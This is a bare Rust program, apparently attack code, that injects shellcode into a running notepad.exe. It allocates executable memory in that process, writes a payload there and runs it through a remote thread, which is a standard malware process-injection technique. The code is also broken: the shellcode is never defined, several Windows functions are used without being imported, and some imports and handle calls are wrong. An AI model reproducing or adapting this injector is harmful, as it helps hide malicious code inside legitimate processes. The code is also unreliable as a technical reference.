use winapi::{
    um::{
        processthreadsapi::OpenProcess,
        tlhelp32::{
            Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS, PROCESS_ALL_ACCESS,
        },
        memoryapi::{VirtualAllocEx, WriteProcessMemory},
        winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
        handleapi::{CloseHandle},
        synchapi::CreateEventW,
        errhandlingapi::GetLastError,
        winbase::WAIT_FAILED,
        winuser::INFINITE,
        minwinbase::LPSECURITY_ATTRIBUTES,
    },
    shared::ntdef::{HANDLE, NULL},
};

fn main() {
    unsafe {
        let snapshot_handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot_handle != NULL {
            let mut process_entry: PROCESSENTRY32 = std::mem::zeroed();
            process_entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
            if Process32First(snapshot_handle, &mut process_entry) == 1 {
                loop {
                    if process_entry.szExeFile.starts_with("notepad.exe") {
                        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, process_entry.th32ProcessID);
                        if process_handle != NULL {
                            let remote_buffer = VirtualAllocEx(process_handle, NULL, shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                            if remote_buffer != NULL {
                                if WriteProcessMemory(process_handle, remote_buffer, shellcode.as_ptr() as *const _, shellcode.len(), NULL) != 0 {
                                    let remote_thread = CreateRemoteThread(process_handle, NULL, 0, Some(std::mem::transmute(remote_buffer)), NULL, 0, NULL);
                                    if remote_thread != NULL {
                                        WaitForSingleObject(remote_thread, INFINITE);
                                        CloseHandle(remote_thread);
                                    }
                                }
                                CloseHandle(remote_buffer);
                            }
                            CloseHandle(process_handle);
                        }
                    }

                    process_entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
                    if Process32Next(snapshot_handle, &mut process_entry) == 0 {
                        break;
                    }
                }
            }

            CloseHandle(snapshot_handle);
        }
    }
}
